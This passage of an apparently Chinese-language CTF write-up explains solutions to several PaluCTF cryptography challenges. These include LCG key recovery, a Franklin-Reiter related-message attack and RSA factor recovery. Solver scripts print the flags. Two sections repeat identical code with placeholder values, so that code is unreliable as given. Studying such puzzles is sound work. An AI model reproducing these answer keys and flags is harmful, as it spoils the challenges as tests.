阿巴雅卡阿巴雅卡阿巴雅卡阿巴雅卡轰 ',<br />\n'p': ' 伊卡阿卡噢伊卡阿卡噢轰 ',<br />\n'q': ' 伊卡阿卡噢伊卡阿卡噢伊卡阿卡噢轰 ',<br />\n'r': ' 伊卡阿卡噢伊卡阿卡噢伊卡阿卡噢伊卡阿卡噢轰 ',<br />\n's': ' 哈姆达姆阿卡嗙哈姆达姆阿卡嗙轰 ',<br />\n't': ' 哈姆达姆阿卡嗙哈姆达姆阿卡嗙哈姆达姆阿卡嗙轰 ',<br />\n'u': ' 哈姆达姆阿卡嗙哈姆达姆阿卡嗙哈姆达姆阿卡嗙哈姆达姆阿卡嗙轰 ',<br />\n'v': ' 咿呀呦咿呀呦轰 ',<br />\n'w': ' 咿呀呦咿呀呦咿呀呦轰 ',<br />\n'x': ' 咿呀呦咿呀呦咿呀呦咿呀呦轰 ',<br />\n'y': ' 咿呀呦咿呀呦咿呀呦咿呀呦咿呀呦轰 ',<br />\n'z': ' 玛卡雅卡玛卡雅卡轰 ',<br />\n'A': ' 玛卡雅卡玛卡雅卡玛卡雅卡轰 ',<br />\n'B': ' 玛卡雅卡玛卡雅卡玛卡雅卡玛卡雅卡轰 ',<br />\n'C': ' 伊卡阿卡伊卡阿卡轰 ',<br />\n'D': ' 伊卡阿卡伊卡阿卡伊卡阿卡轰 ',<br />\n'E': ' 伊卡阿卡伊卡阿卡伊卡阿卡伊卡阿卡轰 ',<br />\n'F': ' 咿呀巴卡咿呀巴卡轰 ',<br />\n'G': ' 咿呀巴卡咿呀巴卡咿呀巴卡轰 ',<br />\n'H': ' 咿呀巴卡咿呀巴卡咿呀巴卡咿呀巴卡轰 ',<br />\n'I': ' 咿呀巴卡咿呀巴卡咿呀巴卡咿呀巴卡咿呀巴卡轰 ',<br />\n'J': ' 达姆阿卡嗙达姆阿卡嗙轰 ',<br />\n'K': ' 达姆阿卡嗙达姆阿卡嗙达姆阿卡嗙轰 ',<br />\n'L': ' 达姆阿卡嗙达姆阿卡嗙达姆阿卡嗙达姆阿卡嗙轰 ',<br />\n'M': ' 达姆阿卡嗙达姆阿卡嗙达姆阿卡嗙达姆阿卡嗙达姆阿卡嗙轰 ',<br />\n'N': ' 巴卡巴卡轰 ',<br />\n'O': ' 巴卡巴卡巴卡巴卡轰 ',<br />\n'P': ' 巴卡巴卡巴卡巴卡巴卡巴卡轰 ',<br />\n'Q': ' 巴卡巴卡巴卡巴卡巴卡巴卡巴卡巴卡轰 ',<br />\n'R': ' 巴卡巴卡巴卡巴卡巴卡巴卡巴卡巴卡巴卡巴卡轰 ',<br />\n'S': ' 呀呦轰 ',<br />\n'T': ' 呀呦呀呦轰 ',<br />\n'U': ' 呀呦呀呦呀呦轰 ',<br />\n'V': ' 呀呦呀呦呀呦呀呦轰 ',<br />\n'W': ' 呀呦呀呦呀呦呀呦呀呦轰 ',<br />\n'X': ' 达姆阿卡轰 ',<br />\n'Y': ' 达姆阿卡达姆阿卡轰 ',<br />\n'Z': ' 达姆阿卡达姆阿卡达姆阿卡轰 ',<br />\n'0': ' 达姆阿卡达姆阿卡达姆阿卡达姆阿卡轰 ',<br />\n'1': ' 达姆阿卡达姆阿卡达姆阿卡达姆阿卡达姆阿卡轰 ',<br />\n'2': ' 玛巴轰 ',<br />\n'3': ' 玛巴玛巴轰 ',<br />\n'4': ' 玛巴玛巴玛巴轰 ',<br />\n'5': ' 玛巴玛巴玛巴玛巴轰 ',<br />\n'6': ' 巴卡玛巴轰 ',<br />\n'7': ' 巴卡玛巴巴卡玛巴轰 ',<br />\n'8': ' 巴卡玛巴巴卡玛巴巴卡玛巴轰 ',<br />\n'9': ' 巴卡玛巴巴卡玛巴巴卡玛巴巴卡玛巴轰 ',<br />\n'=': ' 妈个巴子轰 ',<br />\n'/': ' 妈个巴卡轰 ',<br />\n'+': ' 妈个巴达轰 ',<br />\n}</p>\n<p v:=\"\" k=\"\" for=\"\" k,=\"\" v=\"\" in=\"\" encoding_rules.items()=\"\"><em>#</em> <em>反转编码规则，以便进行解密</em><br />\n decoding_rules =</p>\n<p>def decode(encoded_str):<br />\ndecoded_str = ''<br />\nwhile encoded_str:<br />\nfor key in sorted(decoding_rules, key=len, reverse=True): <em>#</em> <em>根据长度降序排序确保正确匹配</em><br />\n if encoded_str.startswith (key):<br />\ndecoded_str += decoding_rules[key]<br />\nencoded_str = encoded_str[len(key):] <em>#</em> <em>移除已解码部分</em><br />\n break<br />\nreturn decoded_str</p>\n<p><em>#</em> <em>要解码的字符串</em><br />\n encoded_message = ' 玛卡巴卡玛卡巴卡轰达姆阿卡嗙轰阿巴雅卡阿巴雅卡阿巴雅卡轰达姆阿卡嗙轰哈姆达姆阿卡嗙哈姆达姆阿卡嗙哈姆达姆阿卡嗙轰玛卡巴卡轰达姆阿卡嗙轰阿巴雅卡阿巴雅卡轰咿呀呦轰达姆阿卡嗙轰'<br />\ndecoded_message = decode(encoded_message)<br />\nprint(decoded_message)</p>\n<h3 id=\"lcccg\"><a class=\"anchor\" href=\"#lcccg\">#</a> lcccg</h3>\n<p>理论上，除非您知道密钥，否则一次性密码本是不可能破译的，但如果您知道密钥，当然可以将其恢复。<br />\n密钥仅由随机数生成的值的第 1 位串联而成，长度为明文 + 50 位。<br />\n由于我们对明文进行异或，因此它看起来像这样：</p>\n<p>|--------------------------key----------------------|<br />\n|-------------plain_text-------------|<br />\n|--key(50bit)--|-------------key^plain_text---------|</p>\n<p>plain_text 没有办法比知道更多 key^plain_text，但关键（50 位）部分按原样输出。让我们尽力从这里恢复密钥。</p>\n<p>这次使用线性同余法找到密钥，但它有一个稍微特殊的参数，如下所示。</p>\n<p>x1 = 2 * x0 % m <em># m** 保证是奇数</em></p>\n<p>现在，通常情况下，如果将其加倍，您会得到一个偶数，但由于您用奇数取余数，因此不一定会得到偶数。什么情况下？X 会是奇数吗？这是 2x&gt;=m 这就是时机。</p>\n<p>由此，通过知道 x1 的第 1 位是 0 还是 1 , 两次 LCG 它成为了</p>\n<p>x2 = 2 * x1 = 4 * x0 % m</p>\n<p>以同样的方式思考，当你想知道 x0 的值时</p>\n<p>\\1.     x1 的值为偶数时为左半部分，为奇数时为右半部分</p>\n<p>\\2.     如果 x2 的值为偶数，则为红色，如果为奇数，则为绿色。</p>\n<p>\\3.     如果 x3 的值为偶数，则为红色，如果为奇数，则为绿色。</p>\n<p>这样，您可以根据数字是偶数还是奇数将 x0 减半。</p>\n<p><img data-src=\"https://s2.loli.net/2024/04/26/ZUimCOP1seXfIVE.png\" alt=\"标题: fig:\" /></p>\n<p>由于每次可以获得 1bit 的信息，然而，不幸的是，x 只给出了前 50 位。回顾一下之前的算法，2^64 如果减半 50 次，2^64 /250=214=16384 这是一个可以使用暴力的领域。</p>\n<p>之后，如果出现的字符串 paluctf 包含在内，那就是 flag</p>\n<p>from fractions import Fraction<br />\nfrom Crypto.Util.number import *</p>\n<p>def get_x(cipher, pos, m, length):<br />\nhoge = []<br />\nwhile cipher &gt; 0:<br />\nhoge.append(cipher % 2)<br />\ncipher &gt;&gt;= 1</p>\n<p>while(len(hoge) &lt; length):<br />\nhoge.append(0)</p>\n<p>hoge = hoge[pos+1:]</p>\n<p>low = Fraction(0, 1)<br />\nhigh = Fraction(m, 1)</p>\n<p>for i in range(len(hoge)):<br />\nmid = (low+high)/2<br />\nif hoge[i] == 0:<br />\nhigh = mid<br />\nelse:<br />\nlow = mid</p>\n<p>return low.<strong>ceil</strong>(), high.<strong>floor</strong>()</p>\n<p>def challenge(cipher, length, m, x):<br />\ninv2 = pow(2, -1, m)<br />\nxs = [0] * (length+1)<br />\nxs[length] = x<br />\nfor i in range(length, 0, -1):<br />\nxs[i-1] = xs[i] * inv2 % m</p>\n<p>rand = 0<br />\nfor i in range(length):<br />\nrand += (xs[i] &amp; 1) &lt;&lt; i</p>\n<p>num = ((1 &lt;&lt; length) - 1) &amp; (cipher ^ rand)<br />\nif b'ctf' in long_to_bytes(num) :<br />\nprint(long_to_bytes(num))</p>\n<p>m = 7870528503754256659<br />\nlength = 311<br />\ncipher = 3255815260238431584829132773479447408817850185229659648404208268001256903206776002292220185602856730646093869<br />\nlow, high = get_x(cipher, length, m, length + 50)<br />\nprint(high - low)<br />\nfor x in range(low, high+1):<br />\nchallenge(cipher, length, m, x)</p>\n<h3 id=\"gcccd\"><a class=\"anchor\" href=\"#gcccd\">#</a> gcccd</h3>\n<p>m 从注释中可以看出，该标志是用填充加密的，看起来是 PKCS#1 v1.5 ( )。问题的关键 m 在于 m // 2 它还给了我们加密的结果。</p>\n<p>} 考虑到该标志以 结尾 m，因此它变为奇数（} 其 ASCII 码为 0x7d = 125）。这是 m // 2 真的 (m-1) // 2。</p>\n<p>m // 2 存在 m=2*m2+1 关系如果使用相同的公钥对具有线性关系的两个明文进行加密，请使用 Franklin-Reiter 相关消息攻击，因为它是有效的。</p>\n<p>from Crypto.Util.number import*</p>\n<p>n = 128134155200900363557361770121648236747559663738591418041443861545561451885335858854359771414605640612993903005548718875328893717909535447866152704351924465716196738696788273375424835753379386427253243854791810104120869379525507986270383750499650286106684249027984675067236382543612917882024145261815608895379<br />\ne = 5331<br />\nc1 = 60668946079423190709851484247433853783238381043211713258950336572392573192737047470465310272448083514859509629066647300714425946282732774440406261265802652068183263460022257056016974572472905555413226634497579807277440653563498768557112618320828785438180460624890479311538368514262550081582173264168580537990<br />\nc2 = 43064371535146610786202813736674368618250034274768737857627872777051745883780468417199551751374395264039179171708712686651485125338422911633961121202567788447108712022481564453759980969777219700870458940189456782517037780321026907310930696608923940135664565796997158295530735831680955376342697203313901005151<br />\ndef gcd(g1, g2):<br />\nwhile g2:<br />\ng1, g2 = g2, g1 % g2<br />\nreturn g1.monic()</p>\n<p>PRx.&lt;x&gt; = PolynomialRing(Zmod(n))<br />\ng1 = x^e - c2<br />\ng2 = (x*2 + 1)^e - c1</p>\n<p>result = -gcd(g1, g2).coefficients()[0]<br />\nprint(long_to_bytes(int(result*2 + 1)))</p>\n<h3 id=\"peeeq\"><a class=\"anchor\" href=\"#peeeq\">#</a> peeeq</h3>\n<p>首先这里 check 判断的是 m = a * p + b * q 是否存在大于 a&gt;0 且 b&gt;0 的解</p>\n<p>而 while 里的断言 表明 a * p + b * q 最大不能表示的数字 为 leak</p>\n<p><strong>数论：p , q**** 互质</strong> <strong>，</strong> <strong>则最大不能表示的数为：pq - p - q</strong> <strong>即 phi - 1</strong></p>\n<p>所以 phi = leak + 1</p>\n<p>根据 e 的 17 位，然后 gcd 去得到 k*e，最后得到 e</p>\n<p>pinv_e = 12474140378771043865022148848078136936465079800066130234618983104385642778672967864991495110508733111980066517889153671507701349679185396054215439179349403857665966245686661757089470553109534987101888628107055364941617805783362125836104920292552457095662777743387917809524955960583091720618281570118299619677634759<br />\nqinv_e = 1647206449953560407401595632741127506095799998014240087894866808907042944168674423038307995055460808040825182837354682801054048594394389801771888111156812819183105159993880849157459496014737241461466870906700457127028184554416373467332704931423207098246831148428600375416541264997943693621557486559170922000282251<br />\nke = gcd(pinv_e, qinv_e)<br />\nprint(ke.bit_length())<br />\ne = ke // 3<br />\nprint(e)<br />\ne = 102563</p>\n<p>phi 已知可以轻松求出 d，难点在于根据 qinv 和 pinv 复原 n</p>\n<p>我们可以找到 phi (n) = (p - 1) * (q - 1) 存在 k 范围在 3 到 e - 1 满足以下式子</p>\n<p>e * d == 1 (mod phi(n)) e * d == k * phi(n) + 1 <code> 其中</code>  d &lt;phi (n), e &gt; k &gt;= 3</p>\n<p>设 k1, k2 满足以下方程</p>\n<p>qinv, pinv == inverse(q, p), inverse(p, q) q * qinv == 1 + k1 * p p * pinv == 1 + k2 * q</p>\n<p>通过将两个方程相减，得到 q * (qinv + k2) == p * (pinv + k1). p 和 q 是素数且不相同的，所以 得到 p = qinv + k2 以及 q = pinv + k1. 带入 k1 = q - y 到 q * x = 1 + (q - y) * p 得到 x * y = 1 + k1 * k2</p>\n<p>phi (n) 可以继续改写成以下方程</p>\n<p>$ phi(n) = (p - 1) * (q - 1)    = (qinv + k2 - 1) * (pinv + k1 - 1)    \\ = (qinv - 1 + k2) * (pinv - 1 + k1) \\    = (x - 1) * (y - 1) + (x - 1) * k1 + (y - 1) * k2 + k1 * k2 $</p>\n<p>现在可以 遍历 k1 的所有可能，构造关于 pinv (x) 和 qinv (y) 的二元一次方程.</p>\n<p><img data-src=\"https://s2.loli.net/2024/04/26/OfjWp7y9eQb1qz3.png\" alt=\"img\" /></p>\n<p>进而恢复 k1, k2, p, q and n.</p>\n<p>知道 n 和 d ,flag 就能够轻松获取</p>\n<p>e = 102563<br />\nleak = 20650913970072868759959272239604024297420806808659110564312051736808778949599012338389873196411652566474168134639876252857623310159737758732845898956842366935678501021994729279299799994075598575657211550223683499328614158165787416177094173112167115888930719187253398687736037116845083325669521670262760600243895871953940839864925909273175442587377607028910874730344252804963645659770898616148180806608083557249713184454706023876544328444568520666837841566163924062054001534893538655581481021600384148478571641075265311650046699619525464106135807483192890198614434965478741402348088647355476402189540171838712520668315<br />\nphi = leak + 1<br />\nct = 14656499683788461319601710088831412892194505254418064899761498679297764485273476341077222358310031603834624959088854557947176472443021560072783573052603773463734827298069959304747376040480522193600487999140388188743055733577433643210327070027972481119823973316743393323273128561824747871183252082782459568278265418266528855123687868624734106855360408027492126167597948385055908257193701028960507382053300960017612431744000472268868103779169759349652561826935960615964589526055579319224213399173783902104833907847546751649110661705034653912439791460180154034041113546810232929706136321281991114377628823527206109309013<br />\nx = 12474140378771043865022148848078136936465079800066130234618983104385642778672967864991495110508733111980066517889153671507701349679185396054215439179349403857665966245686661757089470553109534987101888628107055364941617805783362125836104920292552457095662777743387917809524955960583091720618281570118299619677634759//e<br />\ny = 1647206449953560407401595632741127506095799998014240087894866808907042944168674423038307995055460808040825182837354682801054048594394389801771888111156812819183105159993880849157459496014737241461466870906700457127028184554416373467332704931423207098246831148428600375416541264997943693621557486559170922000282251//e<br />\nimport gmpy2<br />\nd = gmpy2.invert(e, phi)<br />\nkn = e * d - 1<br />\ncount = 0</p>\n<p>def solve(a, b, c):<br />\nD = b ** 2 - 4 * a * c<br />\nassert gmpy2.is_square(D)<br />\nx1 = (-b + gmpy2.isqrt(D)) // (2 * a)<br />\nx2 = (-b - gmpy2.isqrt(D)) // (2 * a)<br />\nreturn x1, x2</p>\n<p>for k in range(3, e):<br />\nif kn % k == 0:<br />\ncount += 1<br />\nphi_n = kn // k<br />\n<em># coefficients of quadratic eq</em><br />\na = x - 1<br />\nb = x * y - 1 + (x - 1) * (y - 1) - phi_n<br />\nc = (y - 1) * (x * y - 1)<br />\ntry:<br />\nk1, k2 = solve(a, b, c)<br />\nif (x * y - 1) % k1 == 0:<br />\nk2 = (x * y - 1) // k1<br />\nelif (x * y - 1) % k2 == 0:<br />\nk1, k2 = k2, (x * y - 1) // k2<br />\nelse:<br />\nassert False<br />\np, q = x + k2, y + k1<br />\nN = p * q</p>\n<pre><code>   flag = long_to_bytes(pow(ct, d, N)).strip() \n   break \n except AssertionError: \n   pass \n</code></pre>\n<p 51b98a17-6843-4e3b-b06c-3cd956bc944c=\"\">print(flag)<br />\npaluctf</p>\n<h3 id=\"simple_crypto\"><a class=\"anchor\" href=\"#simple_crypto\">#</a> simple_crypto</h3>\n<p><a href=\"https://www.t00ls.com/articles-49265.html\"><em>https://www.t00ls.com/articles-49265.html</em></a></p>\n<p>一模一样的题</p>\n<p bba475793d9fecdc698eb4f36fcf539e=\"\">flag</p>\n<p>from Crypto.Util.number import *<br />\nfrom gmpy2 import *<br />\ngift1 = 1<br />\ngift2 = 1<br />\nn = 1<br />\nc = 1<br />\np = GCD(gift1 + gift2,n)<br />\nq = iroot(n // p , 2)[0]</p>\n<p>flag = &quot;&quot;<br />\nfor i in c:<br />\nif(pow(i,(p-1)//2,p) == 1):<br />\nflag += &quot;0&quot;<br />\nelse:<br />\nflag += &quot;1&quot;<br />\nprint(long_to_bytes(int(flag[::-1],2)))<br />\nb'paluctf{1_4m_th3_b0td_1n_t3st_1n_th3_r0w}’</p>\n<h3 id=\"01110\"><a class=\"anchor\" href=\"#01110\">#</a> 01110</h3>\n<p>from Crypto.Util.number import *<br />\nfrom gmpy2 import *<br />\ngift1 = 1<br />\ngift2 = 1<br />\nn = 1<br />\nc = 1<br />\np = GCD(gift1 + gift2,n)<br />\nq = iroot(n // p , 2)[0]</p>\n<p>flag = &quot;&quot;<br />\nfor i in c:<br />\nif(pow(i,(p-1)//2,p) == 1):<br />\nflag += &quot;0&quot;<br />\nelse:<br />\nflag += &quot;1&quot;<br />\nprint(long_to_bytes(int(flag[::-1],2)))<br />\nb'paluctf{1_4m_th3_b0td_1n_t3st_1n_th3_r0w}’</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi>g</mi><mi>i</mi><mi>f</mi><mi>t</mi><mn>1</mn><mo>=</mo><mo stretchy=\"false\">(</mo><mi>p</mi><mo>+</mo><mi>q</mi><msup><mo stretchy=\"false\">)</mo><mi>s</mi></msup><mi>m</mi><mi>o</mi><mi>d</mi><mi>n</mi><mspace linebreak=\"newline\"></mspace><mi>g</mi><mi>i</mi><mi>f</mi><mi>t</mi><mn>2</mn><mo>=</mo><mo stretchy=\"false\">(</mo><mi>p</mi><mo>−</mo><mi>q</mi><msup><mo stretchy=\"false\">)</mo><mi>s</mi></msup><mi>m</mi><mi>o</mi><mi>d</mi><mi>n</mi></mrow><annotation encoding=\"application/x-tex\">gift1 = (p + q)^s mod n \\\\ gift2 = (p - q)^s mod n\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\">t</span><span class=\"mord\">1</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">p</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">q</span><span class=\"mclose\"><span class=\"mclose\">)</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.7143919999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">s</span></span></span></span></span></span></span></span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\">n</span></span><span class=\"mspace newline\"></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\">t</span><span class=\"mord\">2</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">p</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">q</span><span class=\"mclose\"><span class=\"mclose\">)</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.7143919999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">s</span></span></span></span></span></span></span></span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\">n</span></span></span></span></span></p>\n<p>二项式展开得</p>\n<p>(1) + (2) 得</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi>g</mi><mi>i</mi><mi>f</mi><mi>t</mi><mn>1</mn><mo>=</mo><msup><mi>p</mi><mi>s</mi></msup><mo>+</mo><msup><mi>q</mi><mi>s</mi></msup><mo stretchy=\"false\">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mi>n</mi><mo stretchy=\"false\">)</mo><mo stretchy=\"false\">(</mo><mn>1</mn><mo stretchy=\"false\">)</mo><mspace linebreak=\"newline\"></mspace><mi>g</mi><mi>i</mi><mi>f</mi><mi>t</mi><mn>2</mn><mo>=</mo><msup><mi>p</mi><mi>s</mi></msup><mo>−</mo><msup><mi>q</mi><mi>s</mi></msup><mo stretchy=\"false\">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mi>n</mi><mo stretchy=\"false\">)</mo><mo stretchy=\"false\">(</mo><mn>2</mn><mo stretchy=\"false\">)</mo><mspace linebreak=\"newline\"></mspace><mi>p</mi><mo>=</mo><mi>g</mi><mi>c</mi><mi>d</mi><mo stretchy=\"false\">(</mo><mi>h</mi><mi>i</mi><mi>n</mi><mi>t</mi><mn>1</mn><mo>+</mo><mi>h</mi><mi>i</mi><mi>n</mi><mi>t</mi><mn>2</mn><mo separator=\"true\">,</mo><mi>n</mi><mo stretchy=\"false\">)</mo><mspace linebreak=\"newline\"></mspace><mtext>又</mtext><mi>n</mi><mo>=</mo><mi>p</mi><mo>∗</mo><mo stretchy=\"false\">(</mo><mi>q</mi><mo>∗</mo><mo>∗</mo><mn>2</mn><mo stretchy=\"false\">)</mo><mo>=</mo><mo>&gt;</mo><mi>q</mi><mo>=</mo><mi>i</mi><mi>r</mi><mi>o</mi><mi>o</mi><mi>t</mi><mo stretchy=\"false\">(</mo><mi>n</mi><mi mathvariant=\"normal\">/</mi><mi mathvariant=\"normal\">/</mi><mi>p</mi><mo separator=\"true\">,</mo><mn>2</mn><mo stretchy=\"false\">)</mo><mo stretchy=\"false\">[</mo><mn>0</mn><mo stretchy=\"false\">]</mo></mrow><annotation encoding=\"application/x-tex\">gift1 = p^s + q^s (mod n)  (1) \\\\ gift2 = p^s - q^s (mod n)  (2)\\\\p = gcd(hint1 + hint2, n) \\\\ 又n = p * (q ** 2) =&gt; q = iroot(n // p , 2) [0]\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\">t</span><span class=\"mord\">1</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.9088319999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">p</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.7143919999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">s</span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">q</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.7143919999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">s</span></span></span></span></span></span></span></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\">n</span><span class=\"mclose\">)</span><span class=\"mopen\">(</span><span class=\"mord\">1</span><span class=\"mclose\">)</span></span><span class=\"mspace newline\"></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\">t</span><span class=\"mord\">2</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.9088319999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">p</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.7143919999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">s</span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">q</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.7143919999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">s</span></span></span></span></span></span></span></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\">n</span><span class=\"mclose\">)</span><span class=\"mopen\">(</span><span class=\"mord\">2</span><span class=\"mclose\">)</span></span><span class=\"mspace newline\"></span><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\">p</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\">d</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">t</span><span class=\"mord\">1</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">t</span><span class=\"mord\">2</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">n</span><span class=\"mclose\">)</span></span><span class=\"mspace newline\"></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord cjk_fallback\">又</span><span class=\"mord mathnormal\">n</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.6597200000000001em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\">p</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∗</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">q</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∗</span><span class=\"mspace\" 